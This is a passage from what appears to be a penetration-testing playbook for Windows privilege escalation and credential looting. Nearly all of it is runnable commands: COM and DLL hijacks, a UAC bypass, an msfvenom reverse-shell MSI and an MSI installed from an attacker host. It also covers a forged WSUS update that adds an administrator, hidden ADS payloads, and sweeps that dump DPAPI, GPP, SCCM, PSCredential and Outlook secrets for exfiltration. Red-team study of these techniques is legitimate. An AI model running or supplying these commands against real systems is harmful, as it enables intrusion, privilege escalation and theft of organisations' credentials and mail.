      $_.RegistryRights -match 'SetValue|FullControl'
    }
    if ($bad) {
      [PSCustomObject]@{
        CLSID = ($_.PSPath -split 'CLSID\\')[1] -replace '\\InprocServer32',''
        Path  = (Get-ItemProperty $_.PSPath).'(Default)'
        Who   = ($bad.IdentityReference -join ',')
      }
    }
  }

# Also check HKCU (per-user COM overrides take precedence over HKLM)
Get-ChildItem 'HKCU:\SOFTWARE\Classes\CLSID' -Recurse -ErrorAction SilentlyContinue |
  Where-Object { $_.PSChildName -eq 'InprocServer32' }
```

```powershell
# === Hijack — redirect InprocServer32 to attacker DLL ===
# Pick a CLSID triggered by a SYSTEM service (e.g., Task Scheduler, BITS, Update Orchestrator)
reg add "HKLM\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\<PAYLOAD>.dll" /f
reg add "HKLM\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f

# Or HKCU override (no admin — per-user CLSID wins over HKLM)
reg add "HKCU\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" /ve /t REG_SZ /d "C:\Users\<USER>\AppData\Local\Temp\<PAYLOAD>.dll" /f
reg add "HKCU\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f

# Trigger — force CoCreateInstance of the CLSID
rundll32.exe -sta {<TARGET_CLSID>}
# Or wait for a scheduled task / service restart that naturally loads it
```

#### Living-off-the-land / LOTL variant

```powershell
# Pure PowerShell enumeration + HKCU hijack (no admin, no tools)
# Create HKCU override pointing to a DLL already writable by current user
New-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" -Name '(Default)' -Value "C:\Users\$env:USERNAME\AppData\Local\Temp\<PAYLOAD>.dll"
Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" -Name 'ThreadingModel' -Value 'Both'
```

### 4.4d UAC Bypass via SystemPropertiesAdvanced.exe + srrstr.dll DLL Hijack

Auto-elevated binary `SystemPropertiesAdvanced.exe` loads `srrstr.dll` from PATH directories. If `WindowsApps` (or another user-writable dir) appears in PATH before System32, plant a DLL there for high-integrity code execution without a UAC prompt.

```powershell
# Confirm WindowsApps is in PATH and writable by current user
$env:PATH -split ';' | Where-Object { $_ -match 'WindowsApps' } | ForEach-Object {
    Write-Output $_
    icacls $_
}

# Also check other writable PATH dirs
for %p in ("%PATH:;=" "%") do @icacls %p 2>nul | findstr /i "(M) (W) (F)" && echo [WRITABLE PATH DIR] %p

# Compile payload DLL on attacker (see 4.4b for DllMain stub)
x86_64-w64-mingw32-gcc hijack.c -o srrstr.dll -shared -lws2_32 -s

# Drop the DLL into the writable PATH directory
copy C:\Windows\Temp\srrstr.dll "%LOCALAPPDATA%\Microsoft\WindowsApps\srrstr.dll"

# Trigger — auto-elevates to high integrity, loads our DLL
SystemPropertiesAdvanced.exe
```

#### Living-off-the-land / LOTL variant

```powershell
# On-target detection only (no DLL compilation) — confirm the primitive exists
# If WindowsApps is writable and in PATH before System32, the condition is met
$writable = $env:PATH -split ';' | Where-Object {
    $_ -match 'WindowsApps' -and (Test-Path $_) -and
    (Get-Acl $_ -ErrorAction SilentlyContinue).Access |
    Where-Object { $_.IdentityReference -match $env:USERNAME -and $_.FileSystemRights -match 'Write|Modify|Full' }
}
if ($writable) { Write-Output "[+] UAC bypass viable via SystemPropertiesAdvanced.exe + srrstr.dll in: $writable" }

# Use csc.exe to build a managed DLL on-target if mingw is unavailable
# (limited — managed DLL requires DllExport or COM registration; prefer cross-compile)
```

### 4.4e Windows Printer Driver Directory DLL-Plant Privesc

Distinct from PrintNightmare (CVE exploit): this targets writable vendor printer driver subdirectories under `DriverStore\FileRepository` or `spool\drivers\x64\3` (common Ricoh/Lexmark ACL misconfiguration). When a print job fires or `Add-Printer` triggers a driver reload, the Spooler service (SYSTEM) loads DLLs from these directories.

```powershell
# === Enumerate printer driver directories for weak ACLs ===
Get-PrinterDriver | ForEach-Object {
    $driverPath = Split-Path $_.ConfigFile
    Write-Output "Driver: $($_.Name) → $driverPath"
    icacls $driverPath
} | Out-String | Select-String -Pattern 'BUILTIN\\Users|Everyone|Authenticated Users'

# Check spool\drivers tree directly
icacls "C:\Windows\System32\spool\drivers\x64\3" /T | findstr /i "BUILTIN\\Users Everyone Authenticated"

# DriverStore\FileRepository — third-party drivers live here
Get-ChildItem 'C:\Windows\System32\DriverStore\FileRepository' -Directory |
  Where-Object { $_.Name -match 'ricoh|lexmark|canon|hp|xerox|brother|konica' } |
  ForEach-Object {
    $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
    $bad = $acl.Access | Where-Object {
      $_.IdentityReference -match 'Users|Everyone|Authenticated' -and
      $_.FileSystemRights -match 'Write|Modify|FullControl'
    }
    if ($bad) { Write-Output "[WRITABLE] $($_.FullName) → $($bad.IdentityReference)" }
  }
```

```powershell
# === Identify which DLL to replace ===
# Driver config files reveal DLLs loaded by the Spooler
Get-PrinterDriver | Select-Object Name, ConfigFile, DataFile, HelpFile, DependentFiles | Format-List
# Look for DLLs inside the writable driver directory

# === Plant malicious DLL (use mingw stub from 4.4b) ===
copy C:\Windows\Temp\<PAYLOAD>.dll "C:\Windows\System32\spool\drivers\x64\3\<TARGET_DLL>.dll"

# Trigger reload — add/remove a printer or restart Spooler
Add-Printer -Name "TestPrinter" -DriverName "<DRIVER_NAME>" -PortName "LPT1:" -ErrorAction SilentlyContinue
# Or restart Spooler (requires admin; if already admin, use for SYSTEM escalation)
Restart-Service Spooler
```

#### Living-off-the-land / LOTL variant

```cmd
:: Pure cmd.exe enumeration — no PowerShell
icacls "C:\Windows\System32\spool\drivers\x64\3" /T 2>nul | findstr /i "Users Everyone WRITE MODIFY FULL"
dir /s /b "C:\Windows\System32\DriverStore\FileRepository\*ricoh*" "C:\Windows\System32\DriverStore\FileRepository\*lexmark*"
```

### 4.5 AlwaysInstallElevated
```powershell
# Check if both registry keys are set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1 — generate MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi

# NATIVE ALTERNATIVE (no msfvenom — craft MSI with WiX or use existing .msi):
# Method 1: Use msiexec to install a legitimate MSI that runs a custom action
# Method 2: Use PowerShell to create a simple MSI wrapper (requires WiX toolset)
# Method 3: Use msiexec with an MSI from your attacker HTTP server
msiexec /quiet /qn /i http://<ATTACKER_IP>:<PORT>/shell.msi
```

### 4.6 Scheduled Tasks

> **🛑 RoE note — this section enumerates existing scheduled tasks for privesc.** Creating *new* scheduled tasks as a persistence primitive is governed by the Phase 6 RoE callout: only fire when the engagement validates persistence, use a `engagement-test-<TS>` marker name, coordinate with the detection team, remove at end of engagement.

```powershell
# List all scheduled tasks (cmd.exe native)
schtasks /query /fo LIST /v

# Filter for tasks running as SYSTEM or high-priv accounts
schtasks /query /fo LIST /v | findstr /i "TaskName Author Run As"

# PowerShell native: detailed scheduled task enumeration
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | ForEach-Object {
    $info = $_ | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        Name = $_.TaskName
        Path = $_.TaskPath
        State = $_.State
        RunAs = $_.Principal.UserId
        Action = ($_.Actions | ForEach-Object { $_.Execute + " " + $_.Arguments }) -join "; "
        LastRun = $info.LastRunTime
    }
} | Format-List

# Look for tasks running as SYSTEM that reference writable scripts/binaries
# Check permissions on the target file
icacls "C:\path\to\script.bat"

# Check permissions on all scheduled task binaries (native PowerShell)
Get-ScheduledTask | ForEach-Object {
    $_.Actions | Where-Object { $_.Execute } | ForEach-Object {
        $exe = $_.Execute -replace '"',''
        if (Test-Path $exe -ErrorAction SilentlyContinue) {
            Write-Output "Task binary: $exe"
            icacls $exe
        }
    }
}
```

### 4.7 Stored Credentials & Secrets
```powershell
# Saved credentials (runas)
cmdkey /list
runas /savecred /user:<USER> cmd.exe

# Windows Vault / Credential Manager
rundll32.exe keymgr.dll,KRShowKeyMgr

# Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# SAM backup files
dir C:\Windows\repair\SAM
dir C:\Windows\System32\config\RegBack\SAM

# Unattend / Sysprep files (often contain plaintext creds)
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml C:\*sysprep*.inf 2>nul

# Group Policy Preferences (GPP) — cpassword decryption
# GPP XML files may contain AES-encrypted passwords (key is publicly known)
# Search for Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml, Drives.xml
findstr /si "cpassword" \\<DC_IP>\SYSVOL\<DOMAIN>\Policies\*.xml 2>nul
dir /s /b \\<DC_IP>\SYSVOL\<DOMAIN>\Policies\*Groups.xml 2>nul

# Decrypt cpassword (from Linux)
gpp-decrypt '<CPASSWORD_VALUE>'

# Or via netexec module
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -M gpp_password
# See also: active-directory-methodology.md Phase 2.2 (NetExec GPP enumeration) and README.md cred-type matrix

# Search for passwords in files
findstr /si "password" *.txt *.xml *.ini *.config *.cfg
findstr /si "connectionstring" *.config *.xml

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Or for all users:
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# PowerShell transcripts (if enabled via GPO — often leak plaintext admin creds)
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" 2>nul
dir /s /b C:\Transcripts\*.txt C:\PSTranscripts\*.txt 2>nul
dir /s /b C:\Users\*\Documents\PowerShell_transcript*.txt 2>nul
```

#### 4.7.1 NTFS Alternate Data Streams (ADS)

NTFS supports multiple data streams per file. Attackers and CTF challenges hide credentials, flags, or payloads in ADS — invisible to normal `dir` and `type` commands. **Always check ADS during post-exploitation credential hunting.**

```powershell
# === DETECT ADS ===

# cmd.exe — list files + their alternate streams (native, all Windows versions)
dir /r C:\Users\<USER>\Desktop\
# Output shows streams as:  filename:streamname:$DATA

# PowerShell — list all streams on a specific file
Get-Item C:\Users\<USER>\Desktop\<FILE>.txt -Stream *
# Look for any stream name other than ':$DATA' (the default stream)

# PowerShell — recursive ADS hunt across a directory
Get-ChildItem -Path C:\Users\ -Recurse -Force -ErrorAction SilentlyContinue |
    ForEach-Object { Get-Item $_.FullName -Stream * -ErrorAction SilentlyContinue } |
    Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier' } |
    Select-Object FileName, Stream, Length

# Sysinternals streams.exe (if uploadable) — recursive, fast
# https://learn.microsoft.com/en-us/sysinternals/downloads/streams
streams.exe -s C:\Users\

# === READ / EXTRACT ADS CONTENT ===

# cmd.exe — read ADS content (use more, not type — type doesn't support ADS natively)
more < C:\Users\<USER>\Desktop\<FILE>.txt:<HIDDEN_STREAM>

# PowerShell — read ADS content
Get-Content C:\Users\<USER>\Desktop\<FILE>.txt -Stream <HIDDEN_STREAM>

# PowerShell — extract ADS to a normal file (for binary streams or exfiltration)
Get-Content C:\Users\<USER>\Desktop\<FILE>.txt -Stream <HIDDEN_STREAM> -Raw |
    Set-Content C:\temp\extracted.txt -NoNewline

# cmd.exe — extract binary ADS to file
expand C:\path\file.txt:hidden C:\temp\extracted.bin

# === COMMON ADS HIDING LOCATIONS ===
# - User Desktop files (flags, creds hidden in innocent-looking .txt)
# - Executable files (payloads hidden alongside legit binaries)
# - Log files (hidden configs or creds)
# - C:\Windows\System32 files (persistence payloads)

# === ADS FOR PERSISTENCE (offensive awareness) ===
# Hide a payload in an ADS — avoid leaving standalone executables
# type C:\temp\payload.exe > C:\Windows\System32\drivers\etc\hosts:svchost.exe
# Execute hidden ADS payload:
# wmic process call create "C:\Windows\System32\drivers\etc\hosts:svchost.exe"
# Or via PowerShell:
# Start-Process -FilePath "C:\Windows\System32\drivers\etc\hosts:svchost.exe"
```

> **Key lesson:** A file may show innocuous content via `type` or `Get-Content`, but `dir /r` or `Get-Item -Stream *` can reveal hidden secondary streams (e.g. `<FILE>.txt:<HIDDEN_STREAM>:$DATA`). Always check ADS on suspicious files, especially when the visible content looks like a placeholder or decoy.

#### 4.7.2 RDP Saved Credentials & `.rdp` Files

MSTSC saves connection profiles as `.rdp` files and, when "Remember me" is checked, stores DPAPI-encrypted passwords under `Credential Manager`. Recovering these reveals lateral-movement targets and often the credentials themselves.

```powershell
# Find every .rdp profile across all user profiles
Get-ChildItem -Path C:\Users -Filter *.rdp -Recurse -Force -ErrorAction SilentlyContinue |
  Select-Object FullName, LastWriteTime

# Per-user search (current user)
Get-ChildItem -Path $env:USERPROFILE -Filter *.rdp -Recurse -ErrorAction SilentlyContinue

# View RDP file contents — reveals targets, gateway, and which credential GUID is referenced
Get-Content '<PATH>\<NAME>.rdp'
# Look for: full address:s:<TARGET>, username:s:<USER>, gatewayhostname:s:<RDG>

# List Credential Manager entries (RDP creds appear as TERMSRV/<HOST>)
cmdkey /list

# DPAPI-encrypted RDP credentials live here
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force
Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force

# Find RemoteDesktopConnectionManager (.rdg) files — plaintext servers + DPAPI password blobs
Get-ChildItem -Path C:\Users -Filter *.rdg -Recurse -Force -ErrorAction SilentlyContinue
```

**Decrypt with SharpDPAPI (requires user context or master key):**
```powershell
# Decrypt all RDP Connection Manager files for current user
.\SharpDPAPI.exe rdg /unprotect

# Decrypt every Credential Manager blob for the current user (includes TERMSRV/* RDP creds)
.\SharpDPAPI.exe credentials

# Triage — find all DPAPI-protected blobs and master keys in one shot
.\SharpDPAPI.exe triage

# Targeted RDG file with explicit master key (dumped from LSASS, see 4.17)
.\SharpDPAPI.exe rdg /target:C:\Path\To\file.rdg /mkfile:masterkeys.txt
```

**LOTL — native RDG inspection (no external tools):**
```powershell
# .rdg is XML — grep server names + encrypted password blobs without decrypting
Select-String -Path (Get-ChildItem C:\Users -Recurse -Filter *.rdg).FullName -Pattern '<name>|<userName>|<password>'

# .rdp is plaintext key=value — cat directly
Get-ChildItem C:\Users -Recurse -Filter *.rdp | ForEach-Object {
  Write-Host "=== $($_.FullName) ==="
  Get-Content $_.FullName
}
```

#### 4.7.3 WSUS & SCCM Credential Abuse

SCCM/MECM and WSUS clients store enterprise-grade secrets locally — Network Access Account (NAA) credentials, task-sequence variables, and (when WSUS is on plain HTTP) signed update payloads can be hijacked from any domain-joined machine. Cross-link to [active-directory-methodology.md](active-directory-methodology.md) Phase 13 (SCCM) and Phase 14 (WSUS) for the full attack chain.

**WSUS — from a low-priv user on a domain-joined host:**
```powershell
# Applies when:
#   Update injection (wsuxploit/PyWSUS): WUServer is plain http:// (default in many lab/legacy envs)
#   CVE-2025-59287 (WSUS server unauth RCE, .NET BinaryFormatter): WSUS server :8530/:8531 missing Oct 2025 patch
# Test cost: ~2s registry read for client; nmap :8530/:8531 for server
# If patched (HTTPS-only WUServer + Oct 2025 KB applied): pivot to SCCM (NAA, client push) which is more commonly misconfigured
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
# http:// → vulnerable to MITM update injection. https:// + cert pinning → blocks classic wsuxploit.

# SharpWSUS — inspect WSUS state from the client perspective
.\SharpWSUS.exe inspect

# Plant a malicious update (requires admin on the WSUS server itself)
.\SharpWSUS.exe create /payload:"C:\Windows\System32\cmd.exe" \
  /args:"/c net user <NEW_USER> <PASSWORD> /add && net localgroup Administrators <NEW_USER> /add" \
  /title:"Critical Security Update" \
  /date:2026-04-25 /kb:5099999 /rating:Important \
  /description:"April 2026 cumulative" /url:"http://wsus.local"

# Approve the bogus update for a specific computer group
.\SharpWSUS.exe approve /updateid:<GUID> /computername:<TARGET> /groupname:"All Computers"

# WSUSpect-Proxy / PyWSUS — hijack HTTP WSUS traffic from a MITM position (covered in AD Phase 14.3)
```

**LOTL — pure WMI/registry WSUS triage:**
```powershell
# All WSUS-related GPO / policy keys in one query
Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -ErrorAction SilentlyContinue
Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate' -ErrorAction SilentlyContinue
# Key fields: WUServer, WUStatusServer, UseWUServer

# Last contact / pending updates via Windows Update Agent COM (no tool upload)
$session = New-Object -ComObject Microsoft.Update.Session
$searcher = $session.CreateUpdateSearcher()
$searcher.SearchScope = 1; $searcher.ServerSelection = 1
$searcher.Search("IsInstalled=0").Updates | Select-Object Title,KBArticleIDs
```

**SCCM client-side enumeration & NAA disclosure:**
```powershell
# Detect SCCM client install + site code
Get-WmiObject -Namespace root\ccm -Class SMS_Client -ErrorAction SilentlyContinue
Get-WmiObject -Namespace root\ccm -Class SMS_Authority -ErrorAction SilentlyContinue
# Or via registry:
reg query "HKLM\SOFTWARE\Microsoft\CCM" /v 'AssignedSiteCode'

# SharpSCCM — dedicated tool, runs in user context
.\SharpSCCM.exe local clientinfo                # site code, MP, last policy refresh
.\SharpSCCM.exe local triage                    # one-shot interesting artifacts
.\SharpSCCM.exe get naa                         # extract Network Access Account creds (DPAPI-protected blobs)
.\SharpSCCM.exe get class-instances SMS_Application       # app deployments (often contain creds)
.\SharpSCCM.exe get class-instances CCM_NetworkAccessAccount
.\SharpSCCM.exe get secrets -m wmi              # task-sequence environment variables (passwords-in-plaintext)

# Dump policy XML directly — NAA credentials embedded encrypted; SharpSCCM decrypts via DPAPI
.\SharpSCCM.exe local secrets -m disk
```

**LOTL — pure WMI/registry SCCM triage (no SharpSCCM):**
```powershell
# Site assignment + Management Point
Get-WmiObject -Namespace root\ccm -Class SMS_Authority |
  Select-Object Name,CurrentManagementPoint,SiteCode

# Network Access Account credentials (DPAPI-protected blob in machine policy)
# Returns NetworkAccessUsername / NetworkAccessPassword — NAP is a DPAPI ciphertext
#   that must be decrypted under SYSTEM with the machine master key.
Get-WmiObject -Namespace root\ccm\Policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount |
  Select-Object NetworkAccessUsername,NetworkAccessPassword

# CIM equivalent (preferred on PS 5.1+ / PS 7 — Get-WmiObject is deprecated)
Get-CimInstance -Namespace root\ccm\Policy\Machine\ActualConfig -ClassName CCM_NetworkAccessAccount |
  Select-Object NetworkAccessUsername, NetworkAccessPassword

# Currently deployed applications (look for credential-in-script-arg patterns)
Get-WmiObject -Namespace root\ccm\Policy\Machine\ActualConfig -Class CCM_AppDeliveryType |
  Select-Object AppDeliveryTypeName,Installer

# Cached client policies on disk (often readable as a normal user)
Get-ChildItem 'C:\Windows\CCM\Logs\PolicyAgent.log' -ErrorAction SilentlyContinue
Get-ChildItem 'C:\Windows\CCMCache' -ErrorAction SilentlyContinue

# Task Sequence environment variables persisted to disk during execution
Get-ChildItem -Path 'C:\_SMSTaskSequence','C:\Windows\ccm\logs' -Recurse -Filter *.log -ErrorAction SilentlyContinue |
  Select-String -Pattern 'OSDDomainCredentials|Variable=|Password='
```

#### 4.7.4 PSCredential XML Files — Export-CliXml / Import-CliXml

Admins persist creds with `Export-CliXml`; the resulting XML is DPAPI-bound to the **creating user**. Hunt + replay in the same user context.

```powershell
# Sweep user dirs for serialized PSCredential
Get-ChildItem -Path C:\Users -Recurse -Include *.xml,*.clixml -Force -ErrorAction SilentlyContinue |
  Select-String -Pattern 'PSCredential' -List | Select-Object Path

# Replay (same-user context — DPAPI scope)
$cred = Import-CliXml -Path '<APP_PATH>\cred.xml'
$cred.GetNetworkCredential() | Format-List Domain, UserName, Password

# C2 one-liner — mass-extract every readable PSCredential XML for current user
Get-ChildItem -Path C:\Users -Recurse -Include *.xml,*.clixml -Force -ErrorAction SilentlyContinue |
  ForEach-Object {
    try {
      $c = Import-CliXml $_.FullName -ErrorAction Stop
      if ($c -is [System.Management.Automation.PSCredential]) {
        Write-Output "=== $($_.FullName) ==="
        $c.GetNetworkCredential() | Format-List Domain, UserName, Password
      }
    } catch {}
  }

# Adjacent file types worth a sweep — same hunting pass
Get-ChildItem -Path C:\Users -Recurse -Force -ErrorAction SilentlyContinue `
  -Include unattend.xml,sysprep.xml,Autounattend.xml,*.kdbx,*.rdg,*.ovpn,*.psd1 |
  Select-Object FullName, LastWriteTime, Length

# Credential Manager — list saved creds + Vault entries (no admin needed)
cmdkey /list
VaultCmd /listcreds:"Windows Credentials" /all
```

> **Tip:** `Import-CliXml` requires the same Windows user identity that called `Export-CliXml` — DPAPI master key is per-user. For cross-user, see §4.7.8 below.

---

#### 4.7.5 Office Document Macro and Embedded Credential Looting

User-authored Office docs (xlsm/docm/pptm/xlsb) often hide hardcoded DB conn strings, UNC paths, API tokens, and SMB creds inside legitimate VBA macros. OOXML files are ZIP containers; macros live in `xl/vbaProject.bin` (or `word/`, `ppt/`) as compressed CFBF/OLE streams. Hunt these whenever you land on a finance/HR/ops user box.

```bash
# === Locate Office docs on the foothold host ===
find . -type f \( -iname '*.xlsm' -o -iname '*.docm' -o -iname '*.pptm' -o -iname '*.xlsb' \) 2>/dev/null

# Confirm OOXML zip container and peek at macro presence
file <FILE>.xlsm
unzip -l <FILE>.xlsm | grep -iE 'vbaProject\.bin|customXml|connections'
unzip -d ./loot_<DOC> <FILE>.xlsm
ls -la ./loot_<DOC>/xl/
```

```bash
# === Fast string scrape (catches plaintext literals not compressed) ===
strings -n 8 ./loot_<DOC>/xl/vbaProject.bin | \
  grep -iE 'pwd=|password=|user id=|uid=|server=|data source=|driver=|trusted_connection|odbc|smb://'

# Sweep the whole expanded package - workbook connections often live outside vbaProject.bin
grep -aRiE 'pwd=|password|http[s]?://|api[_-]?key|token' ./loot_<DOC>/
cat ./loot_<DOC>/xl/connections.xml 2>/dev/null
```

```bash
# === olevba - full VBA decompile + IOC extraction (oletools) ===
# https://github.com/decalage2/oletools
pip install oletools

olevba <FILE>.xlsm                              # macro source + auto-IOC summary
olevba --decode <FILE>.xlsm                     # decode hex/Base64/StrReverse obfuscation
olevba --reveal <FILE>.xlsm                     # de-obfuscate VBA literals to readable form
olevba -a <FILE>.xlsm                           # analysis-only (suspicious keywords + IOCs)

# Bulk triage every Office doc in a loot directory
olevba *.docm *.xlsm *.pptm *.xlsb 2>/dev/null | tee macro_triage.txt
```

```bash
# === oledump - pick a specific stream and dump it ===
# https://blog.didierstevens.com/programs/oledump-py/
oledump.py <FILE>.xlsm                          # list all OLE streams (A1, A2, A3...)
oledump.py -s A3 -v <FILE>.xlsm                 # dump stream A3 decompressed (VBA module)
oledump.py -s A3 -v <FILE>.xlsm | grep -iE 'pwd|password|conn|server='
```

```bash
# === Wider sweep - non-macro formats can still leak ===
strings -a -n 8 <FILE>.docx | grep -iE 'pass|pwd|secret|token|conn|http'
unzip -p <FILE>.docx docProps/custom.xml 2>/dev/null
unzip -p <FILE>.docx word/settings.xml 2>/dev/null
```

> **Tip:** xlsm/docm are zip files. If `unzip` fails, rename to `.zip` and retry. `vbaProject.bin` is a CFBF (OLE) container — `olevba` decompresses + decompiles VBA modules; raw `strings` only catches non-compressed string literals.

> **OPSEC:** `olevba` and `oledump` are static analysis — run them on the attacker box after exfil, not on the target. If you must analyze in-place, use `strings` + `unzip` (LOTL on most Linux foothold boxes; absent on Windows by default — exfil first).

**Pivots after extraction:**

```bash
# DB connection string -> direct auth
impacket-mssqlclient <USER>:<PASSWORD>@<TARGET> -windows-auth
mysql -h <TARGET> -u <USER> -p'<PASSWORD>'

# UNC path with embedded creds -> mount the share
smbclient //<TARGET>/<SHARE> -U '<DOMAIN>/<USER>%<PASSWORD>'

# Embedded URL + token -> fetch with discovered creds
curl -sk -H "Authorization: Bearer <TOKEN>" '<URL>'
```

##### Living-off-the-land alternative — native Windows macro inspection (no oletools)

```powershell
# === On a Windows foothold without internet — pure PowerShell ===

# Treat .xlsm/.docm as zip; extract with built-in Expand-Archive (PS 5.0+)
Copy-Item <FILE>.xlsm <FILE>.zip
Expand-Archive -Path <FILE>.zip -DestinationPath .\loot_<DOC>

# Recursive grep for credentials across the unpacked package
Get-ChildItem .\loot_<DOC> -Recurse -File |
  Select-String -Pattern 'pwd=|password|user id=|data source=|server=|odbc|smb://|api[_-]?key|token' -AllMatches

# Find every macro-enabled doc on the host
Get-ChildItem -Path C:\Users -Recurse -Force -ErrorAction SilentlyContinue `
  -Include *.xlsm,*.docm,*.pptm,*.xlsb | Select-Object FullName, LastWriteTime, Length

# Inspect Excel external connections (often plaintext OLEDB/ODBC strings)
[xml]$c = Get-Content .\loot_<DOC>\xl\connections.xml -ErrorAction SilentlyContinue
$c.connections.connection | Format-List name, connectionString, odcFile
```

> **LOTL caveat:** PowerShell cannot decompile compressed VBA from `vbaProject.bin` natively — only `strings`-style scraping. For full macro source, exfil the doc and run `olevba` on Kali.

---

#### 4.7.6 Cached GPP cpassword on Workstation (Host-Side, Not SYSVOL)

When a GPO with GPP creds is unlinked or SYSVOL access is blocked, cached XMLs persist on every endpoint that processed that GPO. Hunt locally after any user shell.

```powershell
# === Local cached GPP cpassword (host-side cache) ===
# Cache survives GPO unlink — only requires a local shell, no domain query, no SYSVOL hit

# 1) Hunt cached GPP XML files (Groups, Services, ScheduledTasks, DataSources, Printers, Drives)
Get-ChildItem -Force -Recurse 'C:\ProgramData\Microsoft\Group Policy\History' `
  -Include Groups.xml,Services.xml,ScheduledTasks.xml,DataSources.xml,Printers.xml,Drives.xml `
  -ErrorAction SilentlyContinue

# 2) Read the file (typical GUID dir is the GPO ID)
Get-Content 'C:\ProgramData\Microsoft\Group Policy\History\{<GPO_GUID>}\Machine\Preferences\Groups\Groups.xml'

# 3) PowerUp flags this automatically
# https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
Import-Module .\PowerUp.ps1
Get-CachedGPPPassword
Invoke-AllChecks
```

```cmd
:: cmd.exe fallback — grep cpassword across the local cache (no PowerShell)
findstr /si "cpassword" "C:\ProgramData\Microsoft\Group Policy\History\*.xml"
```

```bash
# === Decrypt the recovered cpassword on attacker side ===
gpp-decrypt '<CPASSWORD_VALUE>'

# Pivot — usually a local Administrator pushed via GPP
netexec smb <TARGET> -u Administrator -p '<PASSWORD>' --local-auth
impacket-psexec Administrator:'<PASSWORD>'@<TARGET>
```

> **OPSEC:** Passive on-host file read — no domain query, no SYSVOL hit. Useful when SYSVOL search is blocked or the GPO has already been unlinked from the domain.

---

#### 4.7.7 Outlook OST/PST Offline Cache Mining

Outlook caches the user's mailbox locally in .ost (Exchange-cached) or .pst (archive) files under `%LOCALAPPDATA%\Microsoft\Outlook\`. After foothold, exfil and parse offline — Drafts often hold unfinished credential handovers, Sent surfaces password-reset emails, and inline screenshots dodge keyword grep.

```bash
# Locate the cached mailbox on the compromised host
# Windows path: %LOCALAPPDATA%\Microsoft\Outlook\<USER>@<DOMAIN>.ost
dir "%LOCALAPPDATA%\Microsoft\Outlook"

# Exfil the .ost/.pst to attacker box (see file-transfers.md), then convert
# pst-utils ships readpst — converts OST/PST to mbox (one file per Outlook folder)
sudo apt install -y pst-utils

# Convert: -o output dir, -e extracts attachments to separate files
readpst -o /tmp/ost-out -e <USER>@<DOMAIN>.ost
ls /tmp/ost-out/
# Inbox  Drafts  'Sent Items'  'Sync Issues'  Calendar  ...

# Drafts FIRST — users save half-written credential / handover messages there
less "/tmp/ost-out/Drafts"

# CLI grep across all converted folders for creds
grep -rEi 'pass(word|wd)?|cred(ential)?s?|secret|api[_-]?key|token|vpn' /tmp/ost-out/

# Attachments (extracted with -e) — pull docs/images for offline review
find /tmp/ost-out -type f \( -iname '*.png' -o -iname '*.jpg' -o -iname '*.pdf' -o -iname '*.docx' -o -iname '*.xlsx' -o -iname '*.txt' -o -iname '*.zip' \)

# GUI viewer — passwords pasted as inline screenshots bypass grep
sudo apt install -y evolution
evolution "/tmp/ost-out/Drafts.mbox"
# Or thunderbird:
thunderbird "/tmp/ost-out/Drafts.mbox"
```

> **Tip:** PST and OST are interchangeable for readpst. Always view Drafts/Inbox in a GUI client — passwords pasted as inline screenshots ("here's the new VPN password") will not match keyword grep.

> **OPSEC:** Copying a live .ost while Outlook is running fails with sharing-violation errors. Use `esentutl /y /vss` (VSS shadow copy of locked files) or `robocopy /B` (backup-mode read) for a consistent copy without closing Outlook.

---

#### 4.7.8 PowerShell SecureString XML on Disk — Cross-User DPAPI Recovery

Admin/automation scripts often persist credentials with `Export-CliXml` or `ConvertFrom-SecureString | Out-File`. The resulting `.xml` / `.clixml` is a DPAPI blob bound to the **creating user's** master key — readable in that user's context with no admin needed. Header tell: `01000000d08c9ddf...` (CRYPTPROTECT_DATA magic).

```powershell
# === Hunt candidate files ===
# Common names: creds.xml, admin-pass.xml, password.txt, *cred*.clixml, *secure*.xml
Get-ChildItem -Path C:\Users,C:\ProgramData,C:\Scripts,C:\Tasks -Recurse `
  -Include *.xml,*.txt,*.clixml -ErrorAction SilentlyContinue |
  Select-String -Pattern '01000000d08c9ddf' -List | Select-Object Path

# Also check scheduled-task working dirs and Public profile
Get-ChildItem -Path C:\Users\Public,C:\Windows\Temp -Recurse -Include *.xml,*.clixml `
